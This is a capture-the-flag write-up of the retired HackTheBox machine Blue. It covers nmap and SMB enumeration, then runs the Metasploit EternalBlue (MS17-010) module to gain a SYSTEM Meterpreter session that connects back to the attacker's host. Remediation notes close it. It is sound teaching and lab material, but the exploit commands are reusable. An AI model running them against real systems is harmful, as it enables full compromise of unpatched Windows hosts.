HTB Blue: EternalBlue (MS17-010) from nmap to SYSTEM

retired-machineeasy

Blue is a retired HackTheBox easy Windows machine and the single best teacher of why unpatched SMB is catastrophic. Synopsis: enumerate SMB completely, confirm MS17-010, exploit EternalBlue to SYSTEM. Lab target only — techniques below are for retired boxes and authorized systems.

$ Box info

OS: Windows 7 Professional SP1 (hostname HARIS-PC, workgroup WORKGROUP). Difficulty: easy. Address: 10.10.10.40. Services that matter: MSRPC on 135, NetBIOS on 139, SMB on 445. Skills exercised: SMB enumeration, vulnerability confirmation before exploitation, Metasploit operation, Windows flag hunting from a SYSTEM session.

$ Skills required

Nmap service and script scanning, SMB share enumeration with smbclient, Metasploit module configuration (RHOSTS/LHOST discipline), Meterpreter basics.

$ Enumeration — Nmap

# nmap: services plus SMB vuln check
nmap -sC -sV -oN blue.nmap 10.10.10.40
nmap --script smb-vuln-ms17-010 -p 445 10.10.10.40 -oN blue.ms17-010
# nmap: old Windows with SMB open
PORT    STATE SERVICE      VERSION
135/tcp open  msrpc        Microsoft Windows RPC
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
Service Info: Host: HARIS-PC; OS: Windows
# smb-vuln-ms17-010: confirmed vulnerable
Host script results:
| smb-vuln-ms17-010:
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143

Ports 135 (RPC), 139 (NetBIOS) and 445 (SMB) on Windows 7 Professional SP1 — and the vuln script confirms the host is VULNERABLE to remote code execution in SMBv1 (MS17-010, CVE-2017-0143). A confirmed CVE, not a hunch: this is the green light for the EternalBlue path.

$ Enumeration — SMB shares

# bash: list shares and users
smbclient -L //10.10.10.40
nxc smb 10.10.10.40 --shares

Nothing to log into — shares are empty or inaccessible — which tells you the intended path is the SMB service itself, not credentials.

$ Exploitation — EternalBlue

# msfconsole: ms17_010_eternalblue
msfconsole -q
msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 exploit(ms17_010_eternalblue) > set RHOSTS 10.10.10.40
msf6 exploit(ms17_010_eternalblue) > set LHOST 10.10.14.23
msf6 exploit(ms17_010_eternalblue) > run
[*] Meterpreter session 1 opened (10.10.14.23:4444 -> 10.10.10.40:49158)

The module negotiates the SMBv1 transaction overflow and returns a session as NT AUTHORITY\SYSTEM on the first try when the target is genuinely unpatched.

$ Flags

# meterpreter: confirm SYSTEM, locate both flags
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > sysinfo
Computer        : HARIS-PC
OS              : Windows 7 (6.1 Build 7601, Service Pack 1).
meterpreter > search -f user.txt
meterpreter > search -f root.txt

user.txt sits on a standard user desktop while root.txt needs SYSTEM — both fall in the single SYSTEM session. Flag values redacted per HTB rules; earn them in your own lab.

$ Why this works

MS17-010 is a buffer overflow in how SMBv1 handles crafted Trans2 requests. The exploit corrupts kernel pool memory to gain arbitrary code execution at the highest privilege level — one vulnerability equals total compromise, no privilege escalation step needed.

$ Dead ends

Trying SMB brute-force first (wasted twenty minutes — always run the vuln script before password guessing), and forgetting to set LHOST after switching VPN servers (the classic silent failure — session never calls home).

$ Remediation notes

Disable SMBv1 everywhere, apply the MS17-010 patch, block port 445 at the perimeter, and alert on any SMBv1 negotiation still happening on the network. WannaCry wormed the planet through exactly this hole in 2017. Written by Lucky Thandel.
